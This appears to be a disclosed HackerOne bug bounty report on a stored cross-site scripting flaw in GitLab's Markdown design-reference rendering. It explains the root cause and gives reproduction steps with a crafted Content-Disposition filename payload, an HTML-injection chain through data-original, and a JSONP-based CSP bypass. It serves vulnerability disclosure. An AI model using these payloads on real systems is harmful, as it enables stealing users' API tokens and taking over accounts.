---
title: "Stored XSS in Markdown via the DesignReferenceFilter (GitLab)"
url: "https://hackerone.com/reports/1212067"
vuln_class: "Cross-site Scripting (XSS) - Stored"
tech: "GitLab, Ruby, Banzai, Markdown"
bounty: 16000
program: "GitLab"
severity: "critical"
votes: 316
content_quality: "full"
source: "HackerOne disclosed report"
date: 2021-10-18
---

## Summary
When rendering Markdown, links to designs are parsed using `link_reference_pattern`
with `valid_char = %r{[^/\s]}` -- any character other than a forward slash or
whitespace, which allows quotes and other special characters in the matched
`url_filename`.

## Root cause
`DesignReferenceFilter#parse_symbol` does `CGI.unescape(filename)` on the matched
`url_filename`, and `AbstractReferenceFilter` builds the link with string
interpolation:

```ruby
link = %(<a href="#{url}" #{data} title="#{escape_once(title)}" class="#{klass}">#{content}</a>)
```

Because `url` can contain a double quote, it is possible to break out of the `href`
attribute. Normally uploads are sanitized by `CarrierWave::SanitizedFile`, but uploading
a design can skip workhorse by using a `Content-Disposition` header such as
`filename*=ASCII-8BIT''filename.png`, allowing arbitrary characters in the design filename.

## Steps to reproduce
1. Create a new project on gitlab.com.
2. Create a new issue (Burp running).
3. Upload a new design.
4. Edit the request and set the Content-Disposition header to:
   `Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png`
5. Refresh: a design named `bbb"class="gfm"a='.png` now exists.
6. Create a new issue linking the design with inner HTML containing a quote, e.g.
   `<a href='.../designs/bbb%22class%3D%22gfm%22a%3D%27.png'>' vakzz=here</a>`.
7. The rendered markup shows an injected `vakzz` attribute on the `<a>` element.
8. Chain with `ReferenceRedactor` (which rebuilds the raw `<a>` from `data-original`) to
   replace the node with arbitrary HTML. Build the link with the required data attributes
   and put the payload HTML in `data-original`.

## CSP bypass
Use a JSONP endpoint, e.g.
`https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout`.

## Impact
Stored XSS with CSP bypass allowing arbitrary JavaScript anywhere Markdown can be posted
(issues, comments, etc.) -- can be used to create and exfiltrate API tokens with full access.
